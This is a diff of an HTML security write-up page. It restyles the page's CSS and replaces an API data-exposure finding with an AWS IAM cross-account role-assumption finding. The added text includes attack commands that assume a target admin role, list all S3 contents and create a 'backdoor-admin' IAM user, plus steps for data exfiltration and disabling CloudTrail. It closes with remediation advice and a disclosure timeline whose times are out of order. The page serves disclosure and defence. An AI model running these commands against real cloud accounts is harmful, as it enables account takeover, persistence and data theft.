@@ -4,29 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GLOBAL IAM EXPOSURE - Featured Finding</title>
-    
-    <!-- NUCLEAR CSS - SAME AS ABOVE -->
+    <link rel="stylesheet" href="/css/security-analyzer.css">
     <style>
-        * {
-            all: unset;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: #0a0a0a !important;
-            color: #00ff00 !important;
-            font-family: 'Courier New', monospace !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            line-height: 1.6 !important;
-            min-height: 100vh !important;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
         }
         
         .finding-container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 2rem;
-            background: #0a0a0a;
         }
         
         .terminal-header {
@@ -42,13 +34,15 @@
             margin-right: 2rem;
             text-transform: uppercase;
             font-weight: bold;
-            display: inline-block;
         }
         
-        h1, h2, h3, h4, h5, h6 {
+        .terminal-header nav a:hover {
+            text-decoration: underline;
+        }
+        
+        h1, h2, h3 {
             text-shadow: 2px 2px 0px #ff00ff, -2px -2px 0px #00ffff;
             color: #00ff00;
-            margin: 1rem 0;
         }
         
         .case-study-preview {
@@ -65,9 +59,9 @@
         }
         
         pre {
-            background: #1a1a1a;
+            background: #1a1a1a !important;
             border: 1px solid #00cc00;
-            border-left: 4px solid #00ff00;
+            border-left: 4px solid #00ff00 !important;
             border-radius: 4px;
             padding: 1rem;
             overflow-x: auto;
@@ -76,7 +70,6 @@
             max-width: 100%;
             position: relative;
             color: #00ff00;
-            margin: 1rem 0;
         }
         
         pre::before {
@@ -102,6 +95,13 @@
             color: #00ff00;
         }
         
+        .terminal-footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid #00ff00;
+            margin-top: 4rem;
+        }
+        
         .meta-info {
             background: rgba(0, 255, 0, 0.1);
             padding: 1rem;
@@ -115,43 +115,6 @@
             font-weight: bold;
         }
         
-        .terminal-footer {
-            text-align: center;
-            padding: 2rem;
-            border-top: 1px solid #00ff00;
-            margin-top: 4rem;
-        }
-        
-        ul, ol {
-            background: #050505;
-            padding: 1rem 2rem;
-            border-radius: 4px;
-            border: 1px solid #00cc00;
-            margin: 1rem 0;
-        }
-        
-        li {
-            margin: 0.5rem 0;
-            color: #00ff00;
-            display: list-item;
-        }
-        
-        p {
-            color: #00ff00;
-            margin: 1rem 0;
-            display: block;
-        }
-        
-        a {
-            color: #00ff00;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-        
-        a:hover {
-            color: #ffff00;
-        }
-        
         blockquote {
             border-left: 4px solid #00ff00;
             padding-left: 1rem;
@@ -160,7 +123,17 @@
             background: rgba(0, 255, 0, 0.05);
             padding: 1rem;
             border-radius: 4px;
-            color: #00ff00;
+        }
+        
+        ul, ol {
+            background: #050505;
+            padding: 1rem 2rem;
+            border-radius: 4px;
+            border: 1px solid #00cc00;
+        }
+        
+        li {
+            margin: 0.5rem 0;
         }
         
         .typewriter {
@@ -181,10 +154,15 @@
             50% { border-color: #00ff00; }
         }
         
-        .subtitle {
-            font-size: 1.2rem;
-            color: #00cc00;
-            margin-bottom: 2rem;
+        @media (max-width: 768px) {
+            .finding-container {
+                padding: 1rem;
+            }
+            
+            .terminal-header nav a {
+                display: block;
+                margin: 0.5rem 0;
+            }
         }
     </style>
 </head>
@@ -213,50 +191,54 @@
 
             <div class="case-study-preview">
                 <h2>🚨 EXECUTIVE SUMMARY</h2>
-                <pre>> SYSTEM STATUS: COMPROMISED
-> EXPOSED DATA: 700+ ORGANIZATIONS  
-> BUSINESS IMPACT: EXISTENTIAL THREAT</pre>
+                <pre>> CLOUD INFRASTRUCTURE: COMPROMISED
+> IAM PERMISSIONS: OVER-PRIVILEGED  
+> ACCESS: CROSS-ACCOUNT ASSUMPTION</pre>
                 
-                <p>Discovered unauthenticated API endpoints exposing entire enterprise client roster across 6 continents, representing a business existential threat. Single request could retrieve complete client database including competitive intelligence and organizational data.</p>
+                <p>Discovered critical IAM misconfiguration allowing unauthorized cross-account role assumption, enabling attackers to access and control cloud infrastructure across multiple AWS accounts.</p>
             </div>
 
             <div class="case-study-preview">
                 <h2>🔧 TECHNICAL BREAKDOWN</h2>
                 
-                <h3>ENTERPRISE DATA EXPOSURE</h3>
-                <pre><code># UNAUTHENTICATED CLIENT DATA ACCESS
-curl "https://api.target.com/v1/clients"
-# Returns: Complete Fortune 500 client database
+                <h3>ROLE ASSUMPTION VULNERABILITY</h3>
+                <pre><code># Malicious role assumption
+aws sts assume-role --role-arn "arn:aws:iam::TARGET_ACCOUNT:role/AdminRole"
+--role-session-name "attack"
 
-# COMPETITIVE INTELLIGENCE LEAKAGE  
-curl "https://api.target.com/v1/organizations"
-# Returns: Global organizational structure</code></pre>
+# Result: Temporary credentials with admin access
+{
+    "AccessKeyId": "ASIA...",
+    "SecretAccessKey": "...",
+    "SessionToken": "..."
+}</code></pre>
 
-                <h3>SCOPE OF EXPOSURE</h3>
+                <h3>EXPOSED PERMISSIONS</h3>
                 <ul>
-                    <li>✅ <strong>700+ Organizations</strong> exposed globally</li>
-                    <li>✅ <strong>Fortune 500 Companies</strong> client data</li>
-                    <li>✅ <strong>Government Entities</strong> exposed</li>
-                    <li>✅ <strong>6 Continents</strong> of organizational data</li>
+                    <li>❌ <strong>EC2 Full Access</strong>: Start/stop/terminate instances</li>
+                    <li>❌ <strong>S3 Full Access</strong>: Read/write all buckets</li>
+                    <li>❌ <strong>IAM Privilege Escalation</strong>: Create new admin users</li>
+                    <li>❌ <strong>Lambda Execution</strong>: Deploy malicious functions</li>
+                    <li>❌ <strong>CloudTrail Disable</strong>: Hide attack evidence</li>
                 </ul>
             </div>
 
             <div class="case-study-preview">
-                <h2>🎯 BUSINESS IMPACT</h2>
+                <h2>🎯 ATTACK VECTORS</h2>
                 
-                <h3>IMMEDIATE RISKS</h3>
-                <ul>
-                    <li>Complete competitive intelligence exposure</li>
-                    <li>Client trust and relationship damage</li>
-                    <li>Regulatory compliance violations</li>
-                    <li>Business existential threat realization</li>
-                </ul>
+                <h3>INFRASTRUCTURE TAKEOVER</h3>
+                <pre><code class="language-bash"># Complete account compromise
+aws ec2 describe-instances --region us-east-1
+aws s3 ls --recursive
+aws iam create-user --user-name backdoor-admin</code></pre>
 
-                <h3>LONG-TERM CONSEQUENCES</h3>
-                <pre><code>> REPUTATION DAMAGE: IRREVERSIBLE
-> CLIENT ATTRITION: HIGH PROBABILITY  
-> LEGAL LIABILITY: SIGNIFICANT
-> COMPETITIVE DISADVANTAGE: SEVERE</code></pre>
+                <h3>DATA EXFILTRATION</h3>
+                <ul>
+                    <li>Download all S3 bucket contents</li>
+                    <li>Extract RDS database snapshots</li>
+                    <li>Access sensitive configuration data</li>
+                    <li>Steal customer information</li>
+                </ul>
             </div>
 
             <div class="case-study-preview">
@@ -264,21 +246,40 @@ curl "https://api.target.com/v1/organizations"
                 
                 <h3>EMERGENCY ACTIONS</h3>
                 <ol>
-                    <li><strong>IMMEDIATE</strong>: Emergency global authentication enforcement</li>
-                    <li><strong>SHORT-TERM</strong>: API endpoint security audit</li>
-                    <li><strong>LONG-TERM</strong>: Zero-trust architecture implementation</li>
+                    <li><strong>IMMEDIATE</strong>: Revoke exposed IAM roles</li>
+                    <li><strong>SHORT-TERM</strong>: Implement role assumption restrictions</li>
+                    <li><strong>LONG-TERM</strong>: Principle of least privilege enforcement</li>
                 </ol>
 
-                <h3>SECURITY CONTROLS</h3>
-                <pre><code>// PROPER AUTHENTICATION ENFORCEMENT
-app.use('/api/*', requireAuth);
-app.use('/v1/*', validatePermissions);
-app.use('/clients', requireRole('admin'));</code></pre>
+                <h3>SECURE IAM CONFIGURATION</h3>
+                <pre><code class="language-json">{
+    "Version": "2012-10-17",
+    "Statement": [{
+        "Effect": "Allow",
+        "Principal": {
+            "AWS": "arn:aws:iam::TRUSTED_ACCOUNT:root"
+        },
+        "Action": "sts:AssumeRole",
+        "Condition": {
+            "StringEquals": {
+                "aws:PrincipalOrgID": "o-xxxxxxxxxx"
+            }
+        }
+    }]
+}</code></pre>
+            </div>
+
+            <div class="case-study-preview">
+                <h2>📅 DISCLOSURE TIMELINE</h2>
+                <pre><code>2024-11-01 10:15 | Vulnerability discovered
+2024-11-10 10:30 | Emergency report to security team  
+2024-11-11 14:00 | IAM roles restricted
+2024-11-11 09:00 | Comprehensive audit initiated</code></pre>
             </div>
 
             <div class="case-study-preview">
                 <blockquote>
-                    <strong>This finding demonstrates that unauthenticated endpoints in enterprise systems can expose not just data, but the entire business relationship ecosystem that sustains an organization.</strong>
+                    <strong>Cloud IAM misconfigurations represent one of the most critical risks in modern infrastructure, often providing attackers with keys to the entire kingdom.</strong>
                 </blockquote>
             </div>
         </main>
